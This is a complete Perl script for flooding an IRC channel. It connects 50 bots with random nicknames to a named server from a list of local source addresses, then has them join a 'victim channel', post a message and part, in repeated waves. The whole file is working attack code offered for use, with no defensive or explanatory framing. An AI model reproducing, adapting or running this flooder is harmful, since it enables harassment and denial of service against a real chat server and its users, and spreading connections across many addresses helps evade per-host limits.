#!/usr/bin/perl

use IO::Socket;

$addr="irc.starlink.ru"; # irc server
$port=6667; # port

## Flood info
$num=1; # num attacks
$nummes=2; # num attacks on channel
$users=50; # number of users
$numsym=12; # how many symbols in nickname
$hosts='hosts'; # filename with hosts

@sym = ('a'..'z');

## User Information
$info="hren"; # info
$nick=""; # prefix for nickname
$channel='#ruschannel'; # victim channel
$mes1='maravan'; # channel message
$mes2='vah'; # part message

## Log Connection (1-yes, 0-no)
$log=0;
$|=1;

print "channel: ${channel}\n";

open (INFO, $hosts);


for ($i=0; $i<$num; $i++){
	for ($c=0; $c<$users; $c++){
		
		$host=<INFO>;
		chomp ($host);
		
		print "domain='$host' host='$addr' port='$port'\n";
		
		$sock[$c] = IO::Socket::INET->new (PeerAddr => $addr,
                           PeerPort => $port,
                           LocalAddr => $host,
                           Proto    => "tcp",
                           Type     => SOCK_STREAM);


		$sock=$sock[$c];

		binmode ($sock);
		$sock->autoflush();

		$nick[$c]=$nick;
		for ($d=0; $d<$numsym; $d++){
			$ident[$c].=$sym[int(rand(28))];
			$nick[$c].=$sym[int(rand(28))];
		}
		
		$sock->send ("NICK $nick[$c]\r\n");
		$sock->send ("USER $ident[$c] ${host} ${addr} :${info}\r\n");

		while (<$sock>) {
			check4ping ($sock, $_);
			print $_ if $log;
			last if ($_ =~ /376/);
			exit if ($_ =~ /^ERROR/);
		}

		$sock->send ("WHO :$nick[$c]\r\n");

		while (<$sock>) {
			check4ping ($sock, $_);
			print $_ if $log; 
			last if ($_ =~ /315/);
		}

		print "nick='$nick[$c]'\n";

	}
	
	print "all bots ready\n";
		
	for ($d=1; $d<=$nummes; $d++){
		for ($c=0; $c<$users; $c++){
			$sock=$sock[$c];
			$sock->send ("JOIN ${channel}\r\n");
	
#			while (<$sock>) {
#				check4ping ($sock, $_);
#				print $_ if $log; 
#				last if ($_ =~ /End of \/?NAMES list/i);
#			}
		}
		
		for ($c=0; $c<$users; $c++){
			$sock=$sock[$c];
			select (undef, undef, undef, .1);
			$sock->send ("PRIVMSG ${channel} :${mes1}\r\n");
			select (undef, undef, undef, .1);
		}

		for ($c=0; $c<$users; $c++){
			$sock=$sock[$c];
			select (undef, undef, undef, .1);
			$sock->send ("PART ${channel} :${mes2}\r\n");
			select (undef, undef, undef, .1);
		}
		
		select (undef, undef, undef, 2);

	}
	
	select (undef, undef, undef, 1);

	for ($c=0; $c<$users; $c++){
		$sock=$sock[$c];
		close ($sock);
	}

}

close (INFO);


## Test for PING
sub check4ping{
	my ($sock, $data)=@_;
	my ($dop, $server);

	if ($data =~ /^PING/i) {
		($dop, $server) = split (/:/, $data);
		$sock->send ("PONG $server\r\n");
	}
}
